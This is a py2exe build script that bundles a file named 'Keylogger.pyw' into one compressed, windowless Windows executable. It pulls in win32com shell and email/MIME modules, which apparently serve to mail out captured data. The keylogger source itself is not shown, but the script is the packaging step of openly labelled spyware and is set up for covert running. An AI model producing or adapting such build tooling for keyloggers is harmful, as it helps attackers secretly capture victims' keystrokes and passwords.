# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/
try:
    try:
        import py2exe.mf as modulefinder
    except ImportError:
        import modulefinder
    import win32com, sys
    for p in win32com.__path__[1:]:
        modulefinder.AddPackagePath("win32com", p)
    for extra in ["win32com.shell"]: #,"win32com.mapi"
        __import__(extra)
        m = sys.modules[extra]
        for p in m.__path__[1:]:
            modulefinder.AddPackagePath(extra, p)
except ImportError:
    # no build path setup, no worries.
    pass
import modulefinder
modulefinder.AddPackagePath("mail.mime", "base")
modulefinder.AddPackagePath("mail.mime", "multipart")
modulefinder.AddPackagePath("mail.mime", "nonmultipart")
modulefinder.AddPackagePath("mail.mime", "audio")
modulefinder.AddPackagePath("mail.mime", "image")
modulefinder.AddPackagePath("mail.mime", "message")
modulefinder.AddPackagePath("mail.mime", "application")
from distutils.core import setup
import py2exe , sys, os
from win32com.client import Dispatch
import win32com.shell
from win32com.shell import shell

sys.argv.append("py2exe")
EXTRA_INCLUDES = [
    "email.iterators", "email.generator", "email.utils", "email.base64mime", "email", "email.mime",
    "email.mime.multipart", "email.mime.text", "email.mime.base",
    "lxml.etree", "lxml._elementpath", "gzip","email.encoders","win32com"
    ]
setup(
    options = {'py2exe': {'bundle_files': 1,'compressed': True, 'includes': EXTRA_INCLUDES,
                    'dll_excludes': ['w9xpopen.exe','MSVCR71.dll',"mswsock.dll", "powrprof.dll" ]}},
    windows = [{'script': "Keylogger.pyw"}],    
    zipfile = None,
    
)
